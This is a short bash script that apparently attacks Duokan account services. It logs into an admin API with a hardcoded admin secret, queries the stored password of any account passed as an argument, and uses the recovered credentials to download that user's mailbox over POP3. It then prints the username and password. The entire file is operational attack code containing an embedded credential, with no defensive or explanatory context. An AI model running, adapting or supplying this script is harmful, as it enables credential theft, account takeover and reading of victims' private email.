#!/bin/bash
cookiefile=cookie.txt
curl -b $cookiefile -c $cookiefile -d "dk_admin=admin&dk_admin_secret=DuoKan2012" http://api.duokan.com/dk_id/login
query_result="$(curl -b $cookiefile -c $cookiefile http://api.duokan.com/dk_id/misc/querypwd?account=$1 2>/dev/null)"
user=$(echo $query_result | sed -n -e "s/^[^:]*:\([a-zA-Z0-9._-@]*\).*/\1/p")
pass=$(echo $query_result | sed -n -e "s/^.*:.*:\([a-zA-Z0-9._-@]*\).*/\1/p")
python pop3.py mail.iduokan.com 110 $user $pass ./
echo $user
echo $pass
